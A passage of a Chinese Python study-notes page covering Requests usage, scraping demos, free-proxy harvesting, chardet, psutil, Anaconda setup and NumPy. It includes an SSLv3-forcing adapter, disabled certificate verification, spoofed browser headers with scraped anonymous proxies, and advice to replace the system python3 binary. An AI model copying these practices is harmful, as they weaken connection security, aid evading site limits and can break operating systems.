>>> if r.status_code == requests.codes.ok: print(r.headers['content-type'])
application/json; charset=utf-8 # GitHub returns JSON, use the r.json method to parse it into Python objects
>>> commit_data = r.json()
>>> print(commit_data.keys())
[u'committer', u'author', u'url', u'tree', u'sha', u'parents', u'message']
>>> print(commit_data[u'committer'])
{u'date': u'2012-05-10T11:10:50-07:00', u'email': u'me@kennethreitz.com', u'name': u'Kenneth Reitz'}
>>> print(commit_data[u'message'])
makin' history
>>> verbs = requests.options(r.url) # 借助Requests的OPTIONS动词来看看刚使用过的url支持哪些HTTP方法
>>> verbs.status_code               # GitHub与许多API提供方一样,实际上并未实现OPTIONS方法
500
>>> verbs = requests.options('http://a-good-website.com/api/cats')
>>> print(verbs.headers['allow'])   # 如果GitHub正确实现了OPTIONS,那么服务器应该在响应头中返回允许用户使用的HTTP方法
GET,HEAD,POST,OPTIONS

另一个允许的方法是POST,它会创建一个新的提交。由于正在使用Requests代码库,应尽可能避免对它发送笨拙的POST。作为替代,玩玩GitHub的Issue特性,本篇文档是回应Issue #482而添加的。鉴于该问题已经存在,先获取它
>>> r = requests.get('https://api.github.com/repos/requests/requests/issues/482')
>>> r.status_code
200
>>> issue = json.loads(r.text)
>>> print(issue[u'title'])
Feature any http verb in docs
>>> print(issue[u'comments'])
3
>>> r = requests.get(r.url + u'/comments')  # 有3个评论,来看一下最后一个评论
>>> r.status_code
200
>>> comments = r.json()
>>> print(comments[0].keys())
[u'body', u'url', u'created_at', u'updated_at', u'user', u'id']
>>> print(comments[2][u'body'])
Probably in the "advanced" section
>>> print(comments[2][u'user'][u'login']) # 评论者是谁
kennethreitz
>>> body = json.dumps({u"body": u"Sounds great! I'll get right on it!"})
>>> url = u"https://api.github.com/repos/requests/requests/issues/482/comments"
>>> r = requests.post(url=url, data=body)
>>> r.status_code
404  # 身份验证失败
>>> from requests.auth import HTTPBasicAuth
>>> auth = HTTPBasicAuth('fake@example.com', 'not_a_real_password')
>>> r = requests.post(url=url, data=body, auth=auth)
>>> r.status_code
201
>>> content = r.json()
>>> print(content[u'body'])
>>> print(content[u"id"])
5804413
>>> body = json.dumps({u"body": u"Sounds great! I'll get right on it once I feed my cat."})
>>> url = u"https://api.github.com/repos/requests/requests/issues/comments/5804413"
>>> r = requests.patch(url=url, data=body, auth=auth)  # 使用另一个HTTP动词PATCH来编辑评论
>>> r.status_code
200
>>> r = requests.delete(url=url, auth=auth) # DELETE方法删除评论
>>> r.status_code
204
>>> r.headers['status']
'204 No Content'
>>> r = requests.head(url=url, auth=auth)  # 使用一个 HEAD 请求来获取响应头查看已经使用了多少限额ratelimit
>>> print(r.headers)
...
'x-ratelimit-remaining': '4995'
'x-ratelimit-limit': '5000'
...

Custom Verbs
有时候会碰到一些服务器处于某些原因,它们允许或要求用户使用上述HTTP动词之外的定制动词。比如说WEBDAV服务器会要求使用MKCOL方法。Requests一样可以搞定它们。可以使用内建的.request方法

>>> r = requests.request('MKCOL', url, data=data)
>>> r.status_code # 200

【 Link Headers响应头链接字段 】
许多HTTP API都有响应头链接字段的特性,它们使得API能够更好地自我描述和自我显露。GitHub在API中为分页使用这些特性
>>> url = 'https://api.github.com/users/kennethreitz/repos?page=1&per_page=10'
>>> r = requests.head(url=url)
>>> r.headers
{'Date': 'Wed, 09 Oct 2019 12:51:27 GMT', 'Content-Type': 'application/json; charset=utf-8', 'Server': 'GitHub.com', 'Status': '200 OK', 'X-RateLimit-Limit': '60', 'X-RateLimit-Remaining': '59', 'X-RateLimit-Reset': '1570629087', 'Cache-Control': 'public, max-age=60, s-maxage=60', 'Vary': 'Accept, Accept-Encoding', 'ETag': 'W/"ee1ed40ef4f1e8d692a3b4095c49b540"', 'X-GitHub-Media-Type': 'github.v3; format=json', 'Link': '< https://api.github.com/user/119893/repos?page=2&per_page=10>; rel="next", < https://api.github.com/user/119893/repos?page=4&per_page=10>; rel="last"', 'Access-Control-Expose-Headers': 'ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type', 'Access-Control-Allow-Origin': '*', 'Strict-Transport-Security': 'max-age=31536000; includeSubdomains; preload', 'X-Frame-Options': 'deny', 'X-Content-Type-Options': 'nosniff', 'X-XSS-Protection': '1; mode=block', 'Referrer-Policy': 'origin-when-cross-origin, strict-origin-when-cross-origin', 'Content-Security-Policy': "default-src 'none'", 'Content-Encoding': 'gzip', 'X-GitHub-Request-Id': '7461:7A3C:1D72EC4:26CB6BF:5D9DD7CF'}
>>> r.headers['link']
'< https://api.github.com/users/kennethreitz/repos?page=2&per_page=10>; rel="next", < https://api.github.com/users/kennethreitz/repos?page=6&per_page=10>; rel="last"'

Requests会自动解析这些响应头链接字段,并使得它们非常易于使用
>>> r.links["next"]
{'url': 'https://api.github.com/users/kennethreitz/repos?page=2&per_page=10', 'rel': 'next'}
>>> r.links["last"]
{'url': 'https://api.github.com/users/kennethreitz/repos?page=7&per_page=10', 'rel': 'last'}

【 Transport Adapters传输适配器 】
从v1.0.0以后,Requests的内部采用了模块化设计,部分原因是为了实现传输适配器Transport Adapter。传输适配器提供了一个机制,让你可以为HTTP服务定义交互方法,尤其是它允许应用服务前的配置。

Requests自带了一个传输适配器即HTTPAdapter,这个适配器使用了强大的urllib3,为Requests提供了默认的HTTP和HTTPS交互。每当Session被初始化就会有适配器附着在Session上,其中一个供HTTP使用,另一个供HTTPS使用。

Request允许用户创建和使用他们自己的传输适配器,实现他们需要的特殊功能。创建好以后传输适配器可以被加载到一个会话对象上,附带着一个说明告诉会话适配器应该应用在哪个web服务上。

>>> s = requests.Session()
>>> s.mount('https://github.com/', MyAdapter())

这个mount调用会注册一个传输适配器的特定实例到一个前缀上面。加载以后任何使用该会话的HTTP请求,只要其URL是以给定的前缀开头,该传输适配器就会被使用到。
传输适配器的众多实现细节不在本文档的覆盖范围内,不过可以看看接下来这个简单的SSL用例。更多的用法考虑为BaseAdapter创建子类

示例: 指定的SSL版本
Requests开发团队刻意指定了内部库urllib3的默认SSL版本。一般情况下这样做没有问题,不过是不是可能会需要连接到一个服务节点,而该节点使用了和默认不同的SSL版本。
可以使用传输适配器解决这个问题,通过利用HTTPAdapter现有的大部分实现,再加上一个ssl_version参数并将它传递到urllib3中。会创建一个传输适配器,用来告诉urllib3让它使用SSLv3

</pre><textarea>
import ssl
from urllib3.poolmanager import PoolManager
from requests.adapters import HTTPAdapter
class Ssl3HttpAdapter(HTTPAdapter):
    """"Transport adapter" that allows us to use SSLv3."""
    def init_poolmanager(self, connections, maxsize, block=False):
        self.poolmanager = PoolManager(
            num_pools=connections, maxsize=maxsize,
            block=block, ssl_version=ssl.PROTOCOL_SSLv3

</textarea><pre>
Blocking Or Non-Blocking?
With the default Transport Adapter in place, Requests does not provide any kind of non-blocking IO. The Response.content property will block until the entire response has been downloaded. If you require more granularity, the streaming features of the library (see Streaming Requests) allow you to retrieve smaller quantities of the response at a time. However, these calls will still block.

If you are concerned about the use of blocking IO, there are lots of projects out there that combine Requests with one of Python's asynchronicity frameworks. Some excellent examples are requests-threads, grequests, requests-futures, and requests-async.

使用默认的传输适配器,Requests不提供任何形式的非阻塞IO。 Response.content属性会阻塞,直到整个响应下载完成。如果需要更多精细控制,该库的数据流功能允许每次接受少量的一部分响应,不过这些调用依然是阻塞式的。

如果对于阻塞式IO有所顾虑,还有很多项目可以使用,它们结合了Requests和Python的某个异步框架,典型的优秀例子是grequests和requests-futures

</pre>re & lxml<textarea>
import requests, json
from lxml import etree
import re

r = requests.get("https://sf.taobao.com/item_list.htm?spm=a213w.7398504.filter.42.5ddb77312tBKVS&auction_source=0&city=%D6%A3%D6%DD&province=&st_param=-1&auction_start_seg=-1")
r.encoding='gbk'

html = etree.HTML(r.text)
result = html.xpath('//script[@id="sf-item-list-data"]/text()')
data = json.loads(result[0])['data']
print(len(data))

reg = re.compile(r'sf-item-list-data" type="text/json">(.*?)< /script', re.S) # 使.包括换行
result = re.search(reg, r.text).group(1)
data = json.loads(result)['data']
print(len(data))

</textarea>demo: requests contextlib.closing<textarea>
# -*- coding:UTF-8 -*-
import requests
from contextlib import closing

target = 'https://images.unsplash.com/photo-1428509774491-cfac96e12253?dpr=1&'
headers = headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36'}
with closing(requests.get(url=target, stream=True, verify = False, headers = headers)) as r:
    with open('down.jpg', 'ab+') as f:
        for chunk in r.iter_content(chunk_size = 1024):
            if chunk:
                f.write(chunk)
                f.flush()

</textarea>demo: mzitu<textarea>
import requests,os
from lxml import etree

base_url = 'https://www.mzitu.com/page/3/'
BASE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'img')
UA = 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit'

r1 = requests.get(base_url, headers = {'User-Agent': UA})
html = etree.HTML(r1.text)
url_list = html.xpath('//ul[@id="pins"]/li/a/@href')
print('tasks length: ', len(url_list))

for url in url_list:
    # 获取套图链接信息
    r2 = requests.get(url, headers = {'User-Agent': UA})
    html = etree.HTML(r2.text)
    title = html.xpath('//h2/text()')[0]
    num = int(html.xpath('//div[@class="pagenavi"]/a[last()-1]/span/text()')[0])  # 获取套图总张数
    path = os.path.join(BASE_DIR, '[p' + str(num) + ']' + title)  # 保存路径文件夹
    if not os.path.exists(path): os.makedirs(path)
    # 循环获取各图片URL
    for i in range(1, num+1):
        url_new = "%s/%s"%(url, i)
        r3 = requests.get(url_new, headers = {'User-Agent': UA})
        html = etree.HTML(r3.text)
        img_url = html.xpath('//div[@class="main-image"]/p/a/img/@src')[0]
        r4 = requests.get(img_url, headers={'Referer':url_new, 'User-Agent': UA})
        file_name = os.path.join(path, img_url.rsplit('/', maxsplit=1)[1])
        # print(file_name)
        with open(file_name,'wb') as f:
            f.write(r4.content)
    print('>>> %s done' % url)

</textarea>爬取头条收藏:每次响应的json数据中max_repin_time参数不同<textarea>
import requests

headers={
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding':'gzip, deflate, br',
    'Content-Type':'application/x-www-form-urlencoded',
    'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:44.0) Gecko/20100101 Firefox/44.0',
    'Connection': 'keep-alive',
    'Host':'www.toutiao.com',
    'Cookie':'csrftoken=7f352840ef0xxx',
    'X-Requested-With':'XMLHttpRequest'
}

links = []
a=0  # 第一个max_repin_time
for i in range(5):  # 大约有不到100条,每页有20个,重复5次
    url = 'https://www.toutiao.com/c/user/favourite/?page_type=2&user_id=xxxxxxxxxx&max_behot_time=0&count=20&as=A195CD5A9B62DD9&cp=5DAB327D1D392E1&_signature=x0nB6xAXmuwJIkc5kM1VFcdJwf&max_repin_time='+str(a)
    response = requests.get(url, headers=headers)
    s = response.json()
    datas = s.get('data')
    for data in datas:
        links.append({'title': data.get('title'), 'url': data.get('display_url')})
    a=s['max_repin_time'] #重新开始循环得到新的max_repin_time

for link in links:
    print(link.get('title'), link.get('url'))

</textarea>python获取免费代理,多线程和队列验证代理<textarea>
import requests, time, queue, threading
from lxml import etree

'''
采集代理的网站包括如几个：
http://checkip.amazonaws.com
http://www.ip3366.net
无忧代理 : http://www.data5u.com/free
快代理 : https://www.kuaidaili.com/free
小舒代理 : http://www.xsdaili.com/
西刺代理 : http://www.xicidaili.com
89免费代理: http://www.89ip.cn/

最后验证获取的代理哪些可用,免费的代理ip很多都是无法使用或不稳定或时效短,
在此选择的网站是"站长之家",这个网站可用直接返回当前使用的ip以及ip所在地。这里需要注意的是访问前可以设定连接超时的时间如果访问时间超过一定时间,就直接跳过这个代理ip。建议是设定在2秒内
通过requests.get(url, proxies=proxies, timeout=2.01)来验证,如果是4xx或者5xx的响应状态,get函数会报错,所以使用try-except来捕获异常,完成自己的目标
'''

class Proxies:
    def __init__(self):
        self.headers = {
            'Cookie':'channelid=0; sid=1571224436424262; _ga=GA1.2.942099460.1571225273; _gid=GA1.2.1428608542.1571225273; Hm_lvt_7ed65b1cc4b810e9fd37959c9bb51b31=1571225273; Hm_lpvt_7ed65b1cc4b810e9fd37959c9bb51b31=1571235837',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
        }
        self.headers2 = {
            'Cookie':'qHistory=aHR0cDovL3Rvb2wuY2hpbmF6LmNvbV/nq5nplb/lt6Xlhbc=; UM_distinctid=16dd74164d6120-092b485c794981-3c604504-100200-16dd74164d720b; CNZZDATA5082706=cnzz_eid%3D511286300-1571271653-%26ntime%3D1571271653',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
        }
        self.queue = queue.Queue()
        self.max_threads = 10
        self.http = []
        self.https = []

    def proxy_kuai(self):
        """抓取快代理中的免费代理"""
        base_url = 'https://www.kuaidaili.com/free/inha/{}/'
        for i in range(5):
            time.sleep(1)
            res = requests.get(base_url.format(i), headers=self.headers)
            html = etree.HTML(res.text)
            result = html.xpath('//tr/td/text()')
            for i in range(0, len(result), 7):
                tr = result[i:i+7]
                self.queue.put({str(tr[3]).lower(): str(tr[0]) + ':' + str(tr[1])})

    def get_ips(self):
        self.proxy_kuai()

    def go_verify(self, proxy):
        try:
            r = requests.head('http://tool.chinaz.com/', proxies=proxy, timeout=2.01, headers=self.headers2)
        except Exception as e:
            pass
        else:
            if r.status_code < 400:
                if proxy.get('http'): self.http.append(proxy.get('http'))
                if proxy.get('https'): self.https.append(proxy.get('https'))

    def run(self):
        """进行验证并且存储到给定的文件中去"""
        start_ips = time.time()
        print('------开始获取所有免费代理地址-------')
        self.get_ips()
        end_ips = time.time()
        print('------获取结束, 总耗时：{:.2f}s-------'.format(end_ips - start_ips))
        print('------开始验证可用代理-------')
        print('queue size:', self.queue.qsize())
        start_verf = time.time()
        threads = []
        while not self.queue.empty():
            for thread in threads:
                if not thread.is_alive():
                    threads.remove(thread)  # 移除停止活动的线程
            while len(threads) < self.max_threads:
                proxy = self.queue.get()
                thread = threading.Thread(target=self.go_verify, args=(proxy,))
                thread.setDaemon(True)      # 守护线程
                thread.start()
                threads.append(thread)
        end_verf = time.time()
        print('------验证结束,总耗时：{:.2f}s-------'.format(end_verf - start_verf))
        with open('http.txt', 'w') as f:
            for proxy in self.http:
                print(proxy)
                f.write(proxy + '\n')
        with open('https.txt', 'w') as f:
            for proxy in self.https:
                print(proxy)
                f.write(proxy + '\n')
        print('------存储完毕,存储地址为：{} 以及 {}------'.format('http.txt', 'https.txt'))

Proxies().run()

</textarea>代理IP抓取<textarea>
import requests, time, pprint
from lxml import etree

class daili():
    def __init__(self):
        ''' 初始化操作'''
        self.url = "https://www.xicidaili.com/nn"  # 起始url
        self.headers = {                           # 使用的是手机浏览器
            'User-Agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Mobile Safari/537.36'
        }
        self.dl_list = list()                          # 代理字典

    def dl_pool(self, url):
        txt = requests.get(url, headers=self.headers)  # 请求url
        html = etree.HTML(txt.text)                    # 获取url内容用于整理
        for i in range(2, 102):                        # 第一条是表头 一页100行数据
            item = {}
            ip_text = html.xpath('//*[@id="ip_list"]/tr[{}]/td/text()'.format(i))  # 遍历出一行数据
            # 添加字典的对应键值对
            item["IP"] = ip_text[0]
            item["端口"] = ip_text[1]
            item["是否匿名"] = ip_text[4]
            item["类型"] = ip_text[5]
            item["存活时间"] = ip_text[-2]
            item["验证时间"] = ip_text[-1]
            self.dl_list.append(item)            # 添加到列表中
        pprint.pprint(self.dl_list)              # 打印查看效果
        next_page = html.xpath('//*[@id="body"]/div[3]/a[11]/@href')  # 查找下一页url
        if next_page:
            next_url = next_page[0].split('/')   # 下一页url拼接
            next_url = self.url + '/' + next_url[-1]
            print('下页地址',next_url)
            time.sleep(5)                        # 暂停 看下效果
            return self.dl_pool(next_url)        # 继续下一页
        else:
            return
    def __call__(self, *args, **kwargs):
        ''' 流程控制 '''
        self.dl_pool(self.url)         # 调用爬取函数
        # pprint.pprint(self.dl_list)  # 格式化输出字典

def main():
    pp = daili()
    pp()

if __name__ == '__main__':
    main()

</textarea>
</div>

<div id="chardet">
<h4>chardet</h4><pre>
字符串编码一直是令人非常头疼的问题,尤其在处理一些不规范的第三方网页的时候。虽然Python提供了Unicode表示的str和bytes两种数据类型,并且可以通过encode()和decode()方法转换,但在不知道编码的情况下对bytes做decode()不好做。

对于未知编码的bytes,要把它转换成str,需要先"猜测"编码。猜测的方式是先收集各种编码的特征字符,根据特征字符判断就能有很大概率"猜对",从头写这个检测编码的功能费时费力。chardet这个第三方库正好就派上了用场,用它来检测编码,简单易用。获取到编码后再转换为str就可以方便后续处理

安装chardet
如果安装了Anaconda,chardet就已经可用,否则需要在命令行下通过pip安装:
$ pip install chardet

使用chardet
当拿到一个bytes时就可以对其用chardet检测编码
chardet.detect(b'Hello, world!') #  {'encoding': 'ascii', 'confidence': 1.0, 'language': ''}
检测出的编码是ascii,confidence字段表示检测的概率是1.0即100%

检测GBK编码的中文:
data = '离离原上草,一岁一枯荣'.encode('gbk')
chardet.detect(data) # {'encoding': 'GB2312', 'confidence': 0.7407407407407407, 'language': 'Chinese'}
检测的编码是GB2312,GBK是GB2312的超集,两者是同一种编码,检测正确的概率是74%,language字段指出的语言是'Chinese'。

对UTF-8编码进行检测:
data = '离离原上草,一岁一枯荣'.encode('utf-8')
chardet.detect(data) # {'encoding': 'utf-8', 'confidence': 0.99, 'language': ''}

对日文进行检测:
data = '最新の主要ニュース'.encode('euc-jp')
chardet.detect(data) # {'encoding': 'EUC-JP', 'confidence': 0.99, 'language': 'Japanese'}

</pre>
</div>

<div id="psutil">
<h4>psutil</h4><pre>
用Python来编写脚本简化日常的运维工作是Python的一个重要用途。在Linux下有许多系统命令可以时刻监控系统运行的状态,如ps、top、free等。要获取这些系统信息,Python可以通过subprocess模块调用并获取结果,但这样做显得很麻烦,尤其是要写很多解析代码。

在Python中获取系统信息的另一个好办法是使用psutil这个第三方模块,psutil = process and system utilities,它不仅可以通过一两行代码实现系统监控,还可以跨平台使用,支持Linux/UNIX/OSX/Windows等,是系统管理员和运维不可或缺的必备模块。

安装psutil
如果安装了Anaconda,psutil就已经可用,否则需要在命令行下通过pip安装:
$ pip install psutil

获取CPU的信息:2表示双核超线程, 4表示4核非超线程
import psutil
psutil.cpu_count()              # CPU逻辑数量:4
psutil.cpu_count(logical=False) # CPU物理核心:2

统计CPU的用户/系统/空闲时间:
psutil.cpu_times()   # scputimes(user=10963.31, nice=0.0, system=5138.67, idle=356102.45)

再实现类似top命令的CPU使用率,每秒刷新一次,累计10次:
for x in range(10): psutil.cpu_percent(interval=1, percpu=True)

获取内存信息
使用psutil获取物理内存和交换内存信息,分别使用:
>>> psutil.virtual_memory()
svmem(total=8589934592,available=2866520064,percent=66.6,used=7201386496,free=216178688,active=3342192640,inactive=2650341376,wired=1208852480)
>>> psutil.swap_memory()
sswap(total=1073741824, used=150732800, free=923009024, percent=14.0, sin=10705981440, sout=40353792)
返回的是字节为单位的整数,可以看到总内存大小是8589934592=8GB,已用720138649 =6.7GB,使用了66.6%,而交换区大小是1073741824=1 GB。

获取磁盘信息
可以通过psutil获取磁盘分区、磁盘使用率和磁盘IO信息:
>>> psutil.disk_partitions()    # 磁盘分区信息
[sdiskpart(device='/dev/disk1', mountpoint='/', fstype='hfs', opts='rw,local,rootfs,dovolfs,journaled,multilabel')]
>>> psutil.disk_usage('/')      # 磁盘使用情况
sdiskusage(total=998982549504, used=390880133120, free=607840272384, percent=39.1)
>>> psutil.disk_io_counters()   # 磁盘IO
sdiskio(read_count=988513, write_count=274457, read_bytes=14856830464, write_bytes=17509420032, read_time=2228966, write_time=1618405)
可以看到磁盘'/'的总容量是998982549504=930GB,使用了39.1%。文件格式是HFS,opts中包含rw表示可读写,journaled表示支持日志。

获取网络信息
psutil可以获取网络接口和网络连接信息:
>>> psutil.net_io_counters()   # 获取网络读写字节／包的个数
snetio(bytes_sent=3885744870,bytes_recv=10357676702,packets_sent=10613069,packets_recv=10423357,errin=0,errout=0,dropin=0,dropout=0)
>>> psutil.net_if_addrs()      # 获取网络接口信息
{
  'lo0': [snic(family=< AddressFamily.AF_INET: 2>, address='127.0.0.1', netmask='255.0.0.0'), ...],
  'en1': [snic(family=< AddressFamily.AF_INET: 2>, address='10.0.1.80', netmask='255.255.255.0'), ...],
  'en0': [...],
  'en2': [...],
  'bridge0': [...]
}
>>> psutil.net_if_stats() # 获取网络接口状态
{
  'lo0': snicstats(isup=True, duplex=< NicDuplex.NIC_DUPLEX_UNKNOWN: 0>, speed=0, mtu=16384),
  'en0': snicstats(isup=True, duplex=< NicDuplex.NIC_DUPLEX_UNKNOWN: 0>, speed=0, mtu=1500),
  'en1': snicstats(...),
  'en2': snicstats(...),
  'bridge0': snicstats(...)
}

要获取当前网络连接信息,使用net_connections():
>>> psutil.net_connections()
可能会得到一个AccessDenied错误,因为psutil获取信息也是要走系统接口,而获取网络连接信息需要root权限,这种情况下可退出Python交互环境,用sudo重启:
$ sudo python3
Password: ******
Python 3.6.3 ... on darwin
Type "help", ... for more information.
>>> import psutil
>>> psutil.net_connections()
[
    sconn(fd=83, family=< AddressFamily.AF_INET6: 30>, type=1, laddr=addr(ip='::127.0.0.1', port=62911), raddr=addr(ip='::127.0.0.1', port=3306), status='ESTABLISHED', pid=3725),
    sconn(fd=84, family=< AddressFamily.AF_INET6: 30>, type=1, laddr=addr(ip='::127.0.0.1', port=62905), raddr=addr(ip='::127.0.0.1', port=3306), status='ESTABLISHED', pid=3725),
    sconn(fd=93, family=< AddressFamily.AF_INET6: 30>, type=1, laddr=addr(ip='::', port=8080), raddr=(), status='LISTEN', pid=3725),
    sconn(fd=103, family=< AddressFamily.AF_INET6: 30>, type=1, laddr=addr(ip='::127.0.0.1', port=62918), raddr=addr(ip='::127.0.0.1', port=3306), status='ESTABLISHED', pid=3725),
    sconn(fd=105, family=< AddressFamily.AF_INET6: 30>, type=1, ..., pid=3725),
    sconn(fd=106, family=< AddressFamily.AF_INET6: 30>, type=1, ..., pid=3725),
    sconn(fd=107, family=< AddressFamily.AF_INET6: 30>, type=1, ..., pid=3725),
    ...
    sconn(fd=27, family=< AddressFamily.AF_INET: 2>, type=2, ..., pid=1)
]

获取进程信息
通过psutil可以获取到所有进程的详细信息:
>>> psutil.pids()             # 所有进程ID
[3865, 3864, 3863, 3856, 3855, 3853, 3776, ..., 45, 44, 1, 0]
>>> p = psutil.Process(3776)  # 获取指定进程ID=3776,其实就是当前Python交互环境
>>> p.name()                  # 进程名称
'python3.6'
>>> p.exe()                   # 进程exe路径
'/Users/michael/anaconda3/bin/python3.6'
>>> p.cwd()                   # 进程工作目录
'/Users/michael'
>>> p.cmdline()               # 进程启动的命令行
['python3']
>>> p.ppid()                  # 父进程ID
3765
>>> p.parent()                # 父进程
< psutil.Process(pid=3765, name='bash') at 4503144040>
>>> p.children()              # 子进程列表
[]
>>> p.status()                # 进程状态
'running'
>>> p.username()              # 进程用户名
'michael'
>>> p.create_time()           # 进程创建时间
1511052731.120333
>>> p.terminal()              # 进程终端
'/dev/ttys002'
>>> p.cpu_times()             # 进程使用的CPU时间
pcputimes(user=0.081150144, system=0.053269812, children_user=0.0, children_system=0.0)
>>> p.memory_info()           # 进程使用的内存
pmem(rss=8310784, vms=2481725440, pfaults=3207, pageins=18)
>>> p.open_files()            # 进程打开的文件
[]
>>> p.connections()           # 进程相关网络连接
[]
>>> p.num_threads()           # 进程的线程数量
1
>>> p.threads()               # 所有线程信息
[pthread(id=1, user_time=0.090318, system_time=0.062736)]
>>> p.environ()               # 进程环境变量
{'SHELL': '/bin/bash', 'PATH': '/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:...', 'PWD': '/Users/michael', 'LANG': 'zh_CN.UTF-8', ...}
>>> p.terminate()             # 结束进程
Terminated: 15 <-- 自己把自己结束了

和获取网络连接类似,获取一个root用户的进程需要root权限,启动Python交互环境或者.py文件时需要sudo权限。

psutil还提供了一个test()函数,可以模拟出ps命令的效果:
$ sudo python3
>>> import psutil
>>> psutil.test()
USER         PID %MEM     VSZ     RSS TTY           START    TIME  COMMAND
root           0 24.0 74270628 2016380 ?             Nov18   40:51  kernel_task
root           1  0.1 2494140    9484 ?             Nov18   01:39  launchd
root          44  0.4 2519872   36404 ?             Nov18   02:02  UserEventAgent
root          45    ? 2474032    1516 ?             Nov18   00:14  syslogd
root          47  0.1 2504768    8912 ?             Nov18   00:03  kextd
root          48  0.1 2505544    4720 ?             Nov18   00:19  fseventsd
_appleeven    52  0.1 2499748    5024 ?             Nov18   00:00  appleeventsd
root          53  0.1 2500592    6132 ?             Nov18   00:02  configd

</pre>
</div>

<div id="anaconda">
<h4>数据分析之anaconda 环境管理工具 科学计算工具</h4><pre>
anaconda官网或镜像网站
ubuntu下载,执行bash Anaconda3-2019.07-Linux-x86_64.sh
which python查看python命令的地址
$ which python3
/usr/bin/python3
$ ll /usr/bin/python3
lrwxrwxrwx 1 root root 9 Oct 25  2018 /usr/bin/python3 -> python3.6*
$ mv /usr/bin/python3 /usr/bin/python3.bak
$ ll /usr/bin/python*
# 此时可通过python3.bak启动python3
$ ln -s ~/anaconda3/bin/python /usr/bin/python
# 此时可通过python启动anaconda的python
同理更改pip

windows
按照安装程序提示一步步安装就好了,安装完成之后会多几个应用
Anaconda Navigtor：用于管理工具包和环境的图形用户界面,后续涉及的众多管理命令也可以在 Navigator 中手工实现。
Jupyter notebook：基于web的交互式计算环境,可以编辑易于人们阅读的文档,用于展示数据分析的过程。
qtconsole：一个可执行IPython的仿终端图形界面程序,相比Python Shell界面,qtconsole可以直接显示代码生成的图形,实现多行代码输入执行,以及内置许多有用的功能和函数。
spyder：一个使用Python语言、跨平台的、科学运算集成开发环境。

配置环境变量
windows需要在环境变量中添加anaconda的安装目录的Scripts文件夹,比如D:\Software\Anaconda\Scripts
之后就可以打开命令行输入conda --version
为了避免可能发生的错误,在命令行输入conda upgrade --all先把所有工具包进行升级

管理虚拟环境
接下来就可以用anaconda来创建一个个独立的python环境了
activate能引入anaconda设定的虚拟环境中, 如果后面什么参数都不加那么会进入anaconda自带的base环境
conda create -n learn python=3 # 创建一个名称为learn的虚拟环境并指定python版本为3
activate learn # 切换到learn环境
conda env list # 查看所有的环境
conda install requests # 安装第三方包
pip install requests # 安装第三方包
conda remove requests # 卸载第三方包
pip uninstall requests # 卸载第三方包
conda list # 查看当前环境中所有安装了的包
conda env export > environment.yaml # 导出当前环境的包信息,将包信息存入yaml文件中.
conda env create -f environment.yaml # 重新创建一个相同的虚拟环境

</pre>
</div>

<div id="numpy">
<h4>数据分析三剑客：Numpy,Pandas,Matplotlib之numpy</h4><pre>
NumPy是Python语言的一个扩展程序库,支持大量的维度数组与矩阵运算,此外也针对数组运算提供大量的数学函数库。
numpy是基于c语言开发,所以这使得numpy的运行速度很快,高效率运行就是numpy的一大优势

numpy:数据结构基础,是一种开源的数据计算扩展,解决python在数据和数值计算中速度比较慢的问题,numpy重新定义了数值计算中最为基础的数据结构即numpy中的array

NumPy(Numerical Python)是使用Python进行科学计算的基础软件包,除其他外包括：
ndarray
多维操作、矩阵操作
功能强大的N维数组对象。
精密广播功能函数。
集成C/C+和Fortran代码的工具。
强大的线性代数、傅立叶变换和随机数功能。

print([e for e in dir(numpy) if not e.startswith('_')])
['ALLOW_THREADS', 'AxisError', 'BUFSIZE', 'CLIP', 'ComplexWarning', 'DataSource', 'ERR_CALL', 'ERR_DEFAULT', 'ERR_IGNORE', 'ERR_LOG', 'ERR_PRINT', 'ERR_RAISE', 'ERR_WARN', 'FLOATING_POINT_SUPPORT', 'FPE_DIVIDEBYZERO', 'FPE_INVALID', 'FPE_OVERFLOW', 'FPE_UNDERFLOW', 'False_', 'Inf', 'Infinity', 'MAXDIMS', 'MAY_SHARE_BOUNDS', 'MAY_SHARE_EXACT', 'MachAr', 'ModuleDeprecationWarning', 'NAN', 'NINF', 'NZERO', 'NaN', 'PINF', 'PZERO', 'RAISE', 'RankWarning', 'SHIFT_DIVIDEBYZERO', 'SHIFT_INVALID', 'SHIFT_OVERFLOW', 'SHIFT_UNDERFLOW', 'ScalarType', 'Tester', 'TooHardError', 'True_', 'UFUNC_BUFSIZE_DEFAULT', 'UFUNC_PYVALS_NAME', 'VisibleDeprecationWarning', 'WRAP', 'abs', 'absolute', 'absolute_import', 'add', 'add_docstring', 'add_newdoc', 'add_newdoc_ufunc', 'alen', 'all', 'allclose', 'alltrue', 'amax', 'amin', 'angle', 'any', 'append', 'apply_along_axis', 'apply_over_axes', 'arange', 'arccos', 'arccosh', 'arcsin', 'arcsinh', 'arctan', 'arctan2', 'arctanh', 'argmax', 'argmin', 'argpartition', 'argsort', 'argwhere', 'around', 'array', 'array2string', 'array_equal', 'array_equiv', 'array_repr', 'array_split', 'array_str', 'asanyarray', 'asarray', 'asarray_chkfinite', 'ascontiguousarray', 'asfarray', 'asfortranarray', 'asmatrix', 'asscalar', 'atleast_1d', 'atleast_2d', 'atleast_3d', 'average', 'bartlett', 'base_repr', 'binary_repr', 'bincount', 'bitwise_and', 'bitwise_not', 'bitwise_or', 'bitwise_xor', 'blackman', 'block', 'bmat', 'bool', 'bool8', 'bool_', 